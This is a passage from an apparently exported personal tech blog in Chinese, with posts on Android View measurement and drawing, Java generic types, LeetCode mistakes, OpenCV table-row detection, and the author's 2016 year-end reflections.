AT_MOST：最大值模式，只限制子View能具有的最大尺寸，子View必须保证它和它的后代们都在这一范围之内。 了解这些，我们就可以通过重写onMeasure()来确定一个View的尺寸。 但在重写方法时要注意：必须调用setMeasuredDimension() 来将最终尺寸存储在View中，否则会抛出一个IllegalStateException。 xml: 12345&lt;com.viseator.viewtest.VView android:layout_width=\"wrap_content\" android:layout_height=\"100dp\" android:background=\"@color/Gray\" /&gt; VView: 1234567891011@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; int widthMode = MeasureSpec.getMode(widthMeasureSpec); int heightMode = MeasureSpec.getMode(heightMeasureSpec); int width = MeasureSpec.getSize(widthMeasureSpec); int height = MeasureSpec.getSize(heightMeasureSpec); Log.d(TAG, \"widthMode: \" + widthMode); Log.d(TAG, \"heightMode: \" + heightMode); Log.d(TAG, \"width :\" + width); Log.d(TAG, \"height :\" + height); super.onMeasure(widthMeasureSpec, heightMeasureSpec); log: 这段简单的代码验证了之前的说法，分别对宽高设置了wrap_content和固定值，可以发现模式分别为AT_MOST与EXACTLY（以数值表示）。 这里输出的宽高值是以像素为单位的，可以看到高度的期望值就是设置的大小，但wrap_content期望的宽度值为1080（屏幕宽度），默认即为屏幕宽度，但最终计算得出的宽度值由于里面没有文字所以为0。 同样地，UNSPECIFIED模式给出的默认尺寸也是屏幕的宽/高。 所以我们可以看到如果想要实现wrap_content的效果，我们必须在onMeasure中对AT_MOST模式计算其内容宽/高并作为最终的宽/高，否则将以屏幕的宽/高进行填充。以LinearLayout的源码为例： 1234567891011121314151617181920212223242526272829if (useLargestChild &amp;&amp; (heightMode == MeasureSpec.AT_MOST || heightMode == MeasureSpec.UNSPECIFIED)) &#123; mTotalLength = 0; for (int i = 0; i &lt; count; ++i) &#123; final View child = getVirtualChildAt(i); if (child == null) &#123; mTotalLength += measureNullChild(i); continue; &#125; if (child.getVisibility() == GONE) &#123; i += getChildrenSkipCount(child, i); continue; &#125; final LinearLayout.LayoutParams lp = (LinearLayout.LayoutParams) child.getLayoutParams(); // Account for negative margins final int totalLength = mTotalLength; mTotalLength = Math.max(totalLength, totalLength + largestChildHeight + lp.topMargin + lp.bottomMargin + getNextLocationOffset(child)); &#125;&#125;// Add in our paddingmTotalLength += mPaddingTop + mPaddingBottom;int heightSize = mTotalLength; 这部分代码向我们展示了LinearLayout处理子View并计算所有的高度的情况。 知道了这个调用过程，我们就可以真正地进行onMeasure()的重写了。 例如可以暴力指定View尺寸： 1234@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(100,600);&#125; 可以为AT_MOST与UNSPECIFIED模式指定一个默认大小： 123456789101112131415@Overrideprotected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) &#123; setMeasuredDimension(measureSize(widthMeasureSpec), measureSize(heightMeasureSpec));&#125;int measureSize(int measureSpec) &#123; int mode = MeasureSpec.getMode(measureSpec); int size = MeasureSpec.getSize(measureSpec); if (mode == MeasureSpec.EXACTLY) &#123; return size; &#125; else &#123; size = 300; //Default size return Math.min(size,MeasureSpec.getSize(measureSpec)); &#125;&#125; 至于更复杂的计算逻辑由于本人能力有限就不写demo了，如果以后实际中遇到需要的时候再作补充。","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"http://www.viseator.com/tags/View/"}]},{"title":"Android View绘制生命周期总览","date":"2017-03-09T09:22:41.000Z","path":"2017/03/09/android_view_lifeCycle/","text":"为了直观表示整个过程，我制作了一张流程图。注意以下只是整个生命周期中比较常用的方法，并不代表所有的过程。 当一个Activity收到焦点即将要处于激活状态时，将会被要求绘制它的布局，绘制布局之前的过程在这里不涉及，我们从绘制View开始分析。 每个Activity被要求提供一个ViewGroup作为View树的根，也就是我们熟悉的setContentView方法。 1234567891011121314@Overridepublic void setContentView(@LayoutRes int layoutResID) &#123; getDelegate().setContentView(layoutResID);&#125;@Overridepublic void setContentView(View view) &#123; getDelegate().setContentView(view);&#125;@Overridepublic void setContentView(View view, ViewGroup.LayoutParams params) &#123; getDelegate().setContentView(view, params);&#125; 可以看到setContentView拥有三种形式，可以直接传入View、传入一个layout资源文件，或传入一个View文件和一个用于提供参数的LayoutParams对象。 整个过程将从这个根View开始，并遍历它的子View来逐一绘制，每个ViewGroup承担了要求它的子View进行绘制的责任，每个View承担了绘制自身的责任。并且父View会在子View完成绘制之前进行绘制，同级的View将以它们出现在树中的顺序进行绘制。 首先调用的当然是View的构造函数，构造函数分为两种，一种供代码创建的View使用，另一种是由layout文件生成的View使用，区别在于后者会从layout文件中读入所有的属性，前者的属性则需要在代码中设置。 另外后者在所有的子View都生成完毕之后会回调onFinishInflate方法。 在正式绘制之前要进行两个过程（布局机制[layout mechanism]）： 首先是measure过程。这是一个自顶向下的过程，父View将期望尺寸传递给子View，子View需要根据这一信息确定自己的尺寸，并且保证这一尺寸满足父View对其的要求，在子View确定自己尺寸的过程中也要向它的子View传递信息，就这样递归地确定自己的尺寸信息并储存在自身中，保证在measure方法返回时，自身的尺寸信息已经确定。所以在根View的measure方法返回时，所有子View的尺寸信息已经全部确定了。 这个过程需要注意一个View可能不止一次地调用measure方法来对子View进行测量。比如，可能要先传递一个无限制的信息来获取子View想要的尺寸，当子View希望的尺寸过大或过小时，父View需要再次调用measure方法来给予子View一些限制。 第二个是layout过程，这也是一个自顶向下的遍历过程，在这个过程中父View负责按照上一个过程中计算并储存在View中的尺寸信息来正确地放置子View。 同时这个过程可以通过调用requestLayout()来重新进行，并且会引起后面步骤的执行，相当于对以这个View为根的View树进行重新布局。 下面就是真正的绘制过程了，也就是View的draw()方法，在draw()方法中，（如果需要）会依次调用如下方法： drawBackground()：在画布上绘制特定的背景 onDraw()：重写View几乎必重写的一个方法，用于绘制图形 dispatchDraw()：ViewGroup会重写这个方法，用于对所有的子View调用draw()方法进行绘制 onDrawForeground()：用于绘制前景（如果需要） 可以看到如果需要调用上述的方法必定会按照这个顺序进行，也就是说，子View的绘制是在父View绘制之后进行的，而同级View的绘制是根据View在父View中的顺序进行绘制的。 同时这个过程可以通过调用invalidate()来重新进行，相当于进行某个View的重绘。","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"http://www.viseator.com/tags/View/"},{"name":"LifeCycle","slug":"LifeCycle","permalink":"http://www.viseator.com/tags/LifeCycle/"}]},{"title":"Java泛型中List、List&lt;Object&gt;、List&lt;?&gt;的区别","date":"2017-02-14T08:30:22.000Z","path":"2017/02/14/DiffInGeneric/","text":"Java 1.5中引入了泛型的概念以增加代码的安全性与清晰度，同时为了提供对旧代码的兼容性，让旧代码不经过改动也可以在新版本中运行，Java提供了原生态类型（或称原始类型）。但是实际中在新的代码中已经不应该使用原生态类型。 原生态类型的含义是不带任何实际参数的泛型名称，例如Java 1.5后改为泛型实现的List&lt;E&gt;，List就是它的原生态类型，与没有引入泛型之前的类型完全一致。 而在虚拟机层面上，是没有泛型这一概念的——所有对象都属于普通类。在编译时，所有的泛型类都会被视为原生态类型。 那么为什么不应该使用原生态类型呢？ 如果使用原生态类型，就失掉了泛型在安全性和表述性方面的所有优势。——Effective Java 泛型的目的简单地说就是可以让一些运行时才能发现的错误可以在编译期间就可以被编译器所检测出，运行时出问题的代价与编译期出现问题的代价的差别可想而知。换句话说，泛型是编译器的一种及时发现错误的机制，同时也给用户带来了代码的清晰与简洁的附加好处（不必再写一些复杂而危险并且不直观的强制类型转换）。 下面就进入正题谈谈以List为例时List、List&lt;Object&gt;、List&lt;?&gt;的区别。 先下定义： List：原生态类型 List&lt;Object&gt;：参数化的类型，表明List中可以容纳任意类型的对象 List&lt;?&gt;：无限定通配符类型，表示只能包含某一种未知对象类型 下面看一段代码： 1234567public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); List list = strings;//ok List&lt;Object&gt; objects = strings;//Error: java: incompatible types: java.util.List&lt;java.lang.String&gt; cannot be converted to java.util.List&lt;java.lang.Object&gt; &#125;&#125; 我们创建了一个List&lt;String&gt;类型的对象strings，再把它赋给原生态类型List，这是可以的。但是第5行中尝试把它传递给List&lt;Object&gt;时，出现了一个类型不相容错误，注意，这是一个编译期错误。 这是因为泛型有子类型化的规则： List&lt;String&gt;是原生态类型List的一个子类型。虽然String是Object的子类型，但是由于泛型是不可协变的，List&lt;String&gt;并不是List&lt;Object&gt;的子类型，所以这里的传递无法通过编译。 如果像上面那样使用原生态类型会有什么隐患呢？看下面一段代码： 1234567891011public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); unsafeAdd(strings, (Integer)1); System.out.println(strings.get(0)); &#125; private static void unsafeAdd(List list, Object object) &#123; list.add(object); &#125;&#125; 编译器提示了两条警告： 第8行： 123456warning: [rawtypes] found raw type: List private static void unsafeAdd(List list, Object object) &#123; ^ missing type arguments for generic class List&lt;E&gt; where E is a type-variable: E extends Object declared in interface List 警告发现了原生态类型List，同时还贴心地指出了List&lt;E&gt;的形式以及E的来源。 第9行： 12345warning: [unchecked] unchecked call to add(E) as a member of the raw type List list.add(object); ^ where E is a type-variable: E extends Object declared in interface List 同样指出了我们正在把一个对象添加到List中，而这个添加过程由于我们使用了原生态类型而无法被检验。 如果忽略这两条警告并运行这个程序，显然会出现一条错误： 第5行： 1Exception in thread \"main\" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String 我们试图把一个自动装箱后的Integer对象插入到了一个被声明为List&lt;String&gt;的List中，由于我们在unsafeAdd方法中使用了原生态类型，从而使得编译器无法在编译期间检查add参数的合法性，从而没有产生编译错误而是产生了一条警告，运行后当试图把这个错误的Integer对象作为String取出时就会出现ClassCaseException异常，这是个运行时的异常，导致了程序中断。 如果我们把unsafeAdd方法的参数从List改为List&lt;Object&gt;会发生什么呢？正如之前所说的那样，由于List&lt;String&gt;并不是List&lt;Object&gt;的子类型，所以在传递参数的时候就会出现第一段代码中出现的编译期错误。这体现了泛型所带来的安全性。 可以这么说，List&lt;Object&gt;唯一特殊的地方只是Object是所有类型的超类，由于泛型的不可协变性，它只能表示List中可以容纳所有类型的对象，却不能表示任何参数类型的List&lt;E&gt;。 而List&lt;?&gt;则是通配符类型中的一种特例，它并没有extend或super这样的限制，从而可以做到引用任意参数类型的List&lt;E&gt;。但由于没有表示类型的符号（E），在方法中无法引用这个类型，所以它只用于无需使用具体类型的方法之中，如果不是这个情况，则需要使用泛型方法（只用List&lt;?&gt;的不是一个泛型方法，它具有List&lt;?&gt;这个固定的参数`）。 但是List&lt;?&gt;还是不能用作上面的unsafeAdd的参数，修改后会出现一条奇怪的编译错误： 123456789error: no suitable method found for add(Object) list.add(object); ^ method Collection.add(CAP#1) is not applicable (argument mismatch; Object cannot be converted to CAP#1) method List.add(CAP#1) is not applicable (argument mismatch; Object cannot be converted to CAP#1) where CAP#1 is a fresh type-variable: CAP#1 extends Object from capture of ? 这是因为无法将任何元素（null除外）放入List&lt;?&gt;中。这又是为什么呢？先来看一个有限定通配符的例子： 123456789public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;? extends Number&gt; numbers = new ArrayList&lt;Integer&gt;(); numbers= new ArrayList&lt;Double&gt;(); numbers= new ArrayList&lt;Float&gt;(); numbers = new ArrayList&lt;Number&gt;(); numbers.add(new Integer(1)); &#125;&#125; 第7行报出了与之前相似的编译错误： 123456789error: no suitable method found for add(Integer) numbers.add(new Integer(1)); ^ method Collection.add(CAP#1) is not applicable (argument mismatch; Integer cannot be converted to CAP#1) method List.add(CAP#1) is not applicable (argument mismatch; Integer cannot be converted to CAP#1) where CAP#1 is a fresh type-variable: CAP#1 extends Number from capture of ? extends Number 这次我们可以看出错误的原因：可以将一个List&lt;Integer&gt;传递给List&lt;? extends Number&gt;，因为Integer是Number的子类，符合限定符的条件。同理，也可以将类似的对象传递给它，当然也可以把List&lt;Number&gt;传递给它。 如果允许这个对象的add操作，我们无法知道这个参数是否与对象的泛型参数相同，因为我们只知道它是Number的一个子类。 123List&lt;? extends Parent&gt; list = new ArrayList&lt;Child&gt;();List&lt;? extends Parent&gt; parents = list;list.add(new Parent()); 上面的1,2两行是完全合法的，如果允许第3行的add操作，那么会把一个Parent对象加入到一个实际类型是Child的List中，而Parentis-not-a Child，这破坏了Java的类型安全，是绝对不允许的。 上面是有限制通配符的情况，那么针对List&lt;?&gt;这样的无限制通配符更是如此。因此，为了保证类型安全，不允许对List&lt;?&gt;或List&lt;? extends E&gt;这样的通配符类型进行类似add的操作。 使用泛型方法可以避免这个问题（重申通配符类型并不是泛型方法），使用无限制通配符类型可以取代其他需要表示包含某一种对象类型的泛型类型的情况而不是使用原生态类型List。","tags":[{"name":"Java","slug":"Java","permalink":"http://www.viseator.com/tags/Java/"}]},{"title":"LeetCode踩坑集锦","date":"2017-02-05T07:11:24.000Z","path":"2017/02/05/LeetCode/","text":"写在前面寒假（假装）看完《数据结构与算法分析》之后决定是时候开始做LeetCode的题目了，在这里记录下一些LeetCode过程中遇到的坑，做LeetCode不仅是对算法的一种考验，也是对Java基础知识的一种考查，在Java基础并不是太好的现在做一定会漏洞百出，在这里统一做一个记录，也会写下对一些题目的想法。 LeetCodeTwo Sum直观上的方法是遍历所有元素对找出答案，看了解答以后发现可以用Hash表实现，Hash表可以进行对另一个元素的快速查找并返回对应的位置。 12345678910111213public static int[] twoSum(int[] nums, int target) &#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0; i &lt; nums.length; i++) &#123; map.put(nums[i], i); &#125; for (Integer num : map.keySet()) &#123; if (map.containsKey(target - num) &amp;&amp; !Objects.equals(map.get(num), map.get(target - num))) &#123; return new int[]&#123;map.get(num), map.get(target - num)&#125;; &#125; &#125; return null;&#125; 上面的代码在用例[3,3] 6的时候返回结果为null，原因是第7行中第二个判断条件不成立，由于构建hash表的时候后面一个[3,1]覆盖了前面的[3,0]导致无法同时找到两个位置。（提醒了hash表一对一的性质，后面加入的元素如果key相同会覆盖前面的元素） 解决办法是不遍历key而是直接遍历nums数组，比较循环的索引和hash表的value，这样可以保证找到对应的那个位置不同的元素位置。 Rotate Array12345678910public static void rotate(int[] nums, int k) &#123; for (int i = 0; i &lt; k; i++) &#123; int[] temp = new int[nums.length]; temp[0] = nums[nums.length - 1]; for (int j = 0; j &lt; nums.length-1; j++) &#123; temp[j + 1] = nums[j]; &#125; nums = temp; &#125;&#125; 错误的原因是没有理解数组元素传递的本质是对数组对象引用的值传递，刚开始看到这题目觉得怎么可以用java做，java都是值传递无法改变原来数组。上面的做法的结果是把一个新的数组对象的引用赋给了nums的一个拷贝，但是原来的nums并没有引用到新的地址，所以原nums还是保持不变。 查了相关资料了解到数组元素的传递与对象一样（数组也可以看成new int[]产生的对象），传递的是数组的引用的拷贝，可以通过这个引用来修改原数组的数据。","tags":[{"name":"Java","slug":"Java","permalink":"http://www.viseator.com/tags/Java/"},{"name":"Algorithm","slug":"Algorithm","permalink":"http://www.viseator.com/tags/Algorithm/"},{"name":"LeetCode","slug":"LeetCode","permalink":"http://www.viseator.com/tags/LeetCode/"}]},{"title":"2016年度总结","date":"2017-01-20T03:48:14.000Z","path":"2017/01/20/2016年度总结/","text":"2016年度总结写在前面许多人在跟我聊天的时候感慨，时间怎么过得这么快，不知不觉自己就是二十多的人了，过几年就要奔三了。相反地，我却觉得时间过得却不是那么快，因为自己确实在随着时间而改变，而且这样的改变是自己实实在在可以感受到的。从初中开始过来的这几年，可以说是一年一个样子，每次翻看自己一年前写的东西都会看到当时的幼稚与无知，自己也有着许许多多的习惯、看法、认识在随着时间推移在改变着。 而2016年是对身边每一个像我一样的新生都十分关键的一年，经历了身份、时空的转变，带来的是各种观念的迅速变化，但感到庆幸的是我并不惧怕改变。 这大概就是这段时间的必然，我们在快速成长着，不断地丢下之前的想法，不断获取新的东西与认知，不知道这样的改变还会持续多久，但是可以确定的是我确实是在朝着对的方向成长着。 之前的习惯是在每年生日的时候写下一些东西作为记录，但是今年因为忙碌而落下了，在学期结束的时候正好自己所在的两个团队都要求有一篇总结，虽然分别是年度的和学期的，我还是一并写成年度的，大概高中时期的那些种种在现在看来毕竟是过去了，所以这篇总结会分成两部分，先是来华科前的时期，主要内容在来华科后的时期。作为一篇写给别人看的总结就不包含那些生活上的东西了。 高中似乎身边每一个人说起自己的高三时光，都是无尽的考试和补课，和最终那一次高考的种种经历。在这个明确的人生分水岭之前，每个人都不得不正视自己的成绩。 但奇怪（或许不）的是，我对高中的印象却完完全全没有上面说的那些东西，因为它们都随着高考的结束而截止了。我能记住的只有高中生活中那些无关于学习的那些，那些在高三的忙碌中偷得的闲暇，那些三年来朝夕相处的珍贵。 而成绩与最后的结果，现在看来都是一种必然，无论最终的结果如何，都会有一种方式让我好好珍视现在，像高中语文老师寄言的那样：人生的每个阶段都会有每个阶段的痛苦与快乐。 我不曾为自己之前做过的任何一个决定后悔过，它们的结果或已变成好的那方面，或已不再重要。性格如此，我只关注现在的事情，过去的事情会很快放下，从而尽快找到一种适合的方式好好面对当下的那些或好或坏的事情。 在高中时期没有想过自己一定会去哪一个学校，但直觉告诉我一定会有一条路在那里等着我，我没有计划过高考要考多少分，也没有拼命地为了所谓的不浪费去各种揣度志愿应该怎么填，在高中的最后阶段，支持着我的是再也不以分数高低论断一个人的成败的未来和学习真正愿意为之付出精力的东西。 最令我感到幸运的是我在很早的时候我就知道愿意去为什么付出自己的热血，这讲起来又是另一个故事了，但是从我有大学专业这个概念以来，我从来没有考虑过除计算机相关以外的任何一个专业。所以在暑假高考成绩出来的那一刻起华科就成了我最好且是唯一的选择。我的志愿在系统开放十分钟以内就填好了，我想这就是我前面所说的那种必然。 华科来华科以后的生活似乎就成变多线程的了，加入了很多的学生组织，一度让我在时间安排上感到非常爆炸，但是不管怎么样接下的锅我都会好好背到底的。对来华科以后这段时间的总结就按身份不同分成几个方面吧。 联创团队关于华科的一切就是从那时开始了解的，而对于华科的三大团队网上很高的评价和咨询群中表现出来的态度就足够令人向往，而令一方面也让我对自己的水平心生怀疑，虽然早就有学计算机的打算但之前却没有条件让我在这条路上更深一步，这样的心态甚至让我一度在联创招新的时候不敢去投出一份所谓的简历。正如那时所说的那样，我深知自己的水平还不足以加入联创，但是我却有了去提升自己的欲望和前进的动力。 当时在招新快要结束的时候正好班主任（大四学长）来我寝室，闲聊中我说起报名这事，他表示：报个名又不会有什么损失，为什么不试一试呢？现在看来那时候我的心态确实很奇怪，想去追求的东西因为担心自己的能力连第一步都不敢踏出，大概是太过于担心自己会失败吧。 所以在离报名截止还有两天的时候我同时报了联创和冰岩的名，第一次面试是冰岩的一面，因为太过紧张以至于语无论次，讲起来也没有什么逻辑。面试以后就觉得自己跪了。之后是联创的笔试，只知道Android会考Java，所以提前一天买了本Java书看，本来也没有对笔试抱多大的希望，题目里面关于面向对象的内容还是根据之前看过的C++的那套东西答的。所以在后面收到二面通知的时候还是觉得十分惊喜的。 面试我的是朱一百和王启萌，记得那天我们聊的挺开心的，也是我第一次看到808，那时候第一次感觉到自己离这样一个团队这么近。之后给了三个礼拜的时间准备熬测，正好国庆放假，把买的Java和Android的书带回去用最快的速度看，感觉那样这么用心地为了一个目标努力的时候真是非常难得。 再之后的事情似乎又在意料之内了，越到后面越感到自己能实现这件事，所以这件事也就这样实现了。 联创的一切也如同我想的那样，有一群志同道合的伙伴和各种方面都非常强的聚聚学长。加入联创的第一个收获就是让我能看到更大的世界是什么样子，知道同龄的人可以做到什么样子，更重要的是，他们就在我身边。这样的氛围我想在其他的任何地方都很难找到。 实习三个多月，从第一个礼拜没有安卓基础写出第一个APP，接到第一个Java项目，到组队一起写出一个游戏打比赛，再到自己去实现自己的一些想法，其中的成长不言而喻。 做APP的过程其实在DR里面已经有记录，在这里就不一一细数。总的看来，有一些收获对我以后的学习有着很大的帮助： 学会使用Google，习惯在英文环境下解决问题，从一开始对满屏的英文不知所措到后面可以筛选出自己想要的信息，对我的英语能力也是一种提升。（感谢Mentor顺手改的搜索结果显示语言） 看文档写代码而不是看Demo跟着写，一开始遇到不会实现的东西都是先找别人的实现再套用到自己的情境中，后来明白官方提供的文档就是最好的参考资料，虽然有些时候看Demo写可以更快的实现，但是回过头来看看文档总能发现一些新东西从而加强自己的理解。毕竟只有自己写出来的东西才是自己的。 讲究代码的规范性问题。这一点Mentor在对我代码的Review中反复强调了很多次，希望我从一开始就养成好的习惯。 熟悉自己的操作环境，提高效率。花了非常多的时间来折腾Linux，目的就是为了给自己一个可以排除其他干扰高效率地工作的环境。熟悉各种快捷键和插件也是锻炼的一部分。 重视基础。有很多前辈告诉我基础内容非常重要，尤其是像数据结构、算法这样的内容看似平常用不到，但是关键时候看的往往就是这样的基本功。所以我开始想去花一些时间认真地静下心来补一补这些基础内容。 开始写博客来记录一些东西。建了自己的博客，虽然现在只有手头项目相关的三篇博文，很大一部分原因是我认为博文内容一定要是自己理解比较深刻的一些东西才值得写。目前自己水平不高的情况下瞎写一些东西也没有什么价值，应该在之后某个时候觉得自己对某个东西有自己的理解的时候才会好好地把这些分享给别人吧。 Git与团队合作，目前合作的两个项目都是通过git完成的，一开始用git出现了很多问题但是到后面熟悉以后就可以好好利用git的功能了。 其实学到的东西远不止上面总结的这些，很多东西都是从与其他人的接触中慢慢学会的，总之很荣幸可以接触到这个学校最优秀的一群人。 班长大学接下班长职务是想发挥一下自己搞事的天赋，希望能够通过自己的一些行动去为大家做一些事情。平时给同学、班委开会也是对自己的锻炼。感谢在最忙的那些时候有其他的班委主动帮我分担。班上有一群可爱的同学们，虽然说大学同学不似高中那样朝夕相处，但是我希望大家可以一起留下一些美好的回忆。 美团点评技术俱乐部一开始自己对学生组织的打算是一个技术团队和学生组织。因为暑假水群的时候就跟安祺和负责科创的大叔聊过，开学俱乐部招新的时候也跟安祺大叔简单聊了一下，于是就来了刚成立的美团。 因为美团刚成立成员也特别少，所以大家很快就熟悉了， 美团的群也成了我们日常闲扯的地方。而学院今年为科创的各个俱乐部新装修的场地也就在我寝室的顶楼，对于我们来说是一个大福利了。 后来通过学院接到的自己和唐艺峰合作的第一个项目，做一个表格内容识别的东西。在那个时候我才刚有一些Java基础，在想接不接的时候又想起了自己考虑报不报联创一样的情景。这次我没有太多犹豫，一是大一就有可能接到项目做很难得，二是项目对自己的锻炼也是非常大的，不给自己一些压力就不会做成一些事情。 这个项目中间虽然经历了很多日常的绝望，像前辈说的那样踩过了很多的坑，例如PM改需求，但是到最后总算是把第一期完成了，过程中也有了自己三篇博文。 后面学院又跟企业合作拿到了一批新的项目，估计下学期会开始做。在科创这边的活动有学院的支持以后在项目方面就有了保证。希望俱乐部这边能在学院的支持下可以好好发展。 学生会宣传部正如招新的时候所说的，学生会是一个大家庭，在宣传部认识了很多非常可爱的学姐和学长，也结识了一些跟我同届的部员们。 宣传部做出来的东西是实实在在可以被大家看到和关注的，看到自己做出来的海报被贴出来的感觉真的非常好。尝试了第一次用比较长的一段时间用心做一张真正意义上的海报，第一次用AE撸出第一个视频被大家转发。 宣传部的大家都很有爱（虽然群里总是gaygay的），但是每次问一些问题总会有人回答。例会的零食、部长的宅舞、圣诞的贺卡……这一切回忆起来总是那么温馨。 这个学期接的锅其实就一张海报，视频的活还没有开始接，自己也因为联创的事情鸽了一些活动。下学期会好好弥补的。 关于未来总结下来这一年的我似乎没有遇到什么太大的困难（或者说那些困难到现在看已经算不上了），一切都在向着充满希望的方向发展着。班主任曾对我们说过一句话：“大家都希望成为自己想要的样子，但是到最后大部分都成了自己愿意成为的样子。”计划总是赶不上变化的，我也是一个不善于计划的人，我对于自己未来的走向的改变总是在平时的一个个决定中促成的，好在现在看来还是走在应该走的路上。 从加入联创的那一刻起我已经决定不读研，知乎上看过一句话是：“大学把一件事做到牛逼才谈得上成功的大学生活。”那么我想这件事对于我一定是技术，有这样的氛围和条件让我去好好做这件事必然不会让我失望。我也希望自己能真正地专注在一件事情上。 虽然我不是一个理想主义者，但是现在的我是充满着希望的，因为我看到了我可以成为怎样的人，看到了未来的那些可能，知道了那样一部分自己的未来会是怎么一个样子。 但是不管自己的打算多么好，条件多么优越，始终不能变的是自己的努力，在这里也要告诫自己要Stay Hungry, Stay Foolish.时刻保持清醒，保持自知。 “你要克服的是你的虚荣心，是你的炫耀欲，你要对付的是你时刻想要出风头的小聪明。”——蔡千嬅 共勉。","tags":[{"name":"Summary","slug":"Summary","permalink":"http://www.viseator.com/tags/Summary/"}]},{"title":"OpenCV处理拍照表格（三）","date":"2016-12-09T08:12:51.000Z","path":"2016/12/09/OpenCV处理拍照表格（三）/","text":"说明在开始说明直线检测过程前先作个说明，由于直线检测的算法需要遍历每个像素，所以总的耗时比较长，在安卓上跑的时候直线检测的时间可能会长达两分钟，这是在测试过程中不能接受的，所以我将安卓上的代码整个迁移到了Idea中，关于Idea中OpenCV的配置，可以参见这个教程。 这个步骤的目的：这步中我们会检测出整张图片中满足条件的所有直线，再通过筛选选出横的表格框线，再利用检测出的表格框线来提取两个框线之间的内容即为表格中的一行。 代码实现12345678910111213141516171819202122232425private void cutImagesToRows() &#123; ArrayList&lt;Double&gt; lineYs = new ArrayList&lt;&gt;(); ArrayList&lt;Double&gt; uniqueLineYs = new ArrayList&lt;&gt;(); //lines:a special mat for find lines Mat lines = new Mat(); //find lines and store in lines Imgproc.HoughLinesP(dilateMuchPic, lines, 1, Math.PI / 180, Y_THRESHOLD, Y_MINLINELENGTH, Y_MAXLINEGAP); //get the lines information from lines and store in lineYs for (int i = 0; i &lt; lines.rows(); i++) &#123; double[] points = lines.get(i, 0); double y1, y2; //just need the horizontal lines y1 = points[1]; y2 = points[3]; // if it slopes, get the average of them, store the y-coordinate if (Math.abs(y1 - y2) &lt; 30) &#123; lineYs.add((y1 + y2) / 2); &#125; &#125; getUniqueLines(lineYs, uniqueLineYs, 10); 上面的注释里面讲得比较清楚，另外有一些解释： 前面提到过HoughLinesP这个函数的第二个参数是一个特殊的Mat，也就是代码中的lines，它的col（列）的值为1，row（行）的值为检测出的所有直线 （这里要注意一下，我手上的书的这两个值正好相反，可能是标准不同，我这里用的是OpenCV 3.1）。每个row为一个double[4]，四个值分别对应着起始点的x,y坐标，终点的x,y坐标（图片的左上角为原点）。两个点连起来就是检测出的直线。可以看到这里我只取了1,3，对应的是起点和终点的y坐标。 if (Math.abs(y1 - y2) &lt; 30)这句判断的目的是过滤掉竖直的直线（起始点y坐标之差显然大于30），并且允许横线有一定的倾斜（起始点可以有30像素的差距）。找到这样的一对点后，把它们的y坐标取平均值存入一个数组中。 ​ 由于图片中一条直线的宽度不可能正好是一个像素，所以必然会出现一条直线检测出很多个y坐标的问题，下面这个方法就是为了找到这些多余的y坐标并取它们的平均值作为最终的y坐标。 getUniqueLines(lineYs, uniqueLineYs, 10);代码如下： 12345678910111213141516171819202122232425/** * filter the source coordinates, if some values are too close ,get the average of them * * @param src source coordinates list * @param dst destination coordinate list * @param minGap the minimum gap between coordinates */private void getUniqueLines(ArrayList&lt;Double&gt; src, ArrayList&lt;Double&gt; dst, int minGap) &#123; Collections.sort(src); //sort the source coordinates list for (int i = 0; i &lt; src.size(); i++) &#123; double sum = src.get(i); double num = 1; //when the distance between lines less than minGap, get the average of thema while (i != src.size() - 1 &amp;&amp; src.get(i + 1) - src.get(i) &lt; minGap) &#123; num++; sum = sum + src.get(i + 1); i++; &#125; if (num == 1) &#123; dst.add(src.get(i)); &#125; else &#123; dst.add(((sum / num))); &#125; &#125;&#125; minGap：直线间距阈值，间距小于这个值的直线被处理。 1234567891011121314151617181920blockImages = new ArrayList&lt;&gt;();for (int i = 0; i &lt; uniqueLineYs.size(); i++) &#123; Rect rect; double y = uniqueLineYs.get(i); //if not the last line if (i != uniqueLineYs.size() - 1) &#123; rect = new Rect((int) (srcPic.width() * PADDING_LEFT_RIGHT), (int) (y + (uniqueLineYs.get(i + 1) - y) * PADDING_TOP_BOTTOM), (int) (srcPic.width() * (1 - PADDING_LEFT_RIGHT * 2)), (int) ((uniqueLineYs.get(i + 1) - y) * (1 - PADDING_TOP_BOTTOM * 2))); &#125; else &#123; //the last line rect = new Rect((int) (srcPic.width() * PADDING_LEFT_RIGHT), (int) (y + (srcPic.height() - y) * PADDING_TOP_BOTTOM), (int) (srcPic.width() * (1 - PADDING_LEFT_RIGHT * 2)), (int) ((srcPic.height() - y) * (1 - PADDING_TOP_BOTTOM * 2))); &#125; //cut the source picture to cutMat Mat cutMat = new Mat(srcPic, rect); blockImages.add(cutMat); 这步就是切割了，blockImages就是存放切割后的行图像的ArrayList。 关于Rect：Rect对象表示一个区域，可以作为Mat的构造参数传入来为目标区域创造一个Mat副本。四个参数分别代表了区域起始点的x,y坐标，区域长度和区域高度。 可以看到这里我使用了一个PADDING参数，来规定切割时距规定边缘的距离来避免把一些表格的边线切到图像中影响OCR的识别。 至于上面一篇博客中最后的红线是测试时用 12345678910111213private void showMarkedLines(Mat src, ArrayList&lt;Double&gt; lines) &#123; Mat showLines = new Mat(); Imgproc.cvtColor(src, showLines, COLOR_GRAY2BGR); for (double y : lines) &#123; Point pt1 = new Point(0, y); Point pt2 = new Point(src.width(), y); Imgproc.line(showLines, pt1, pt2, new Scalar(0, 0, 255), 3); &#125; Imgcodecs.imwrite(\"C:/Users/visea/Desktop/test/java/cut/\" + String.valueOf(colNum) + \".jpg\", showLines);&#125; 打印出来的，这里新建了一个showLines并且把原图像通过Imgproc.cvtColor方法转换成BGR图像并复制到showLines（不转化成彩色格式只能显示灰度图像）。 打印一条直线也比较简单，只要新建两个Point对象代表起始点和终点，这里我把x坐标设置为图像的起始x坐标，y坐标为之前得到的唯一的y值，所以可以看到画出来的线就是水平并且从开头一直到结束的。 